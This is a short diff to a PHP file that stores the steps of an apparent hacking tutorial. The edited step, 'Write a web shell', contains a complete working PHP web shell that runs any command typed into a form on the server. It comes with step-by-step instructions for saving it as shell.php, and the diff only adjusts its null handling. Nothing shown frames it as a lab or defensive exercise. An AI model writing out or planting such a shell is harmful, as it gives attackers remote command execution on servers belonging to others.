@@ -42,7 +42,7 @@ $GUIDE = [
 ['t' => 'Write a web shell',
  'b' => '<p>Make a file on your own computer called <code>shell.php</code> holding exactly this. It is a command box, not a URL trick: whatever you type into it runs on the server, and the output prints right there on the page.</p>',
  'try' => [
-     'shell.php' => '<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"]))."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>',
+     'shell.php' => '<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"])??"")."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>',
      '--1' => '<strong>Windows:</strong> Notepad, then Save as, and set <em>Save as type</em> to <em>All files</em> so it does not become shell.php.txt.',
      '--2' => '<strong>Mac:</strong> TextEdit, then Format &rarr; Make Plain Text before you save.',
      '--3' => '<strong>Linux or a terminal:</strong> <code>nano shell.php</code>, paste, <strong>Ctrl+O</strong> then <strong>Enter</strong> to save, <strong>Ctrl+X</strong> to leave.',
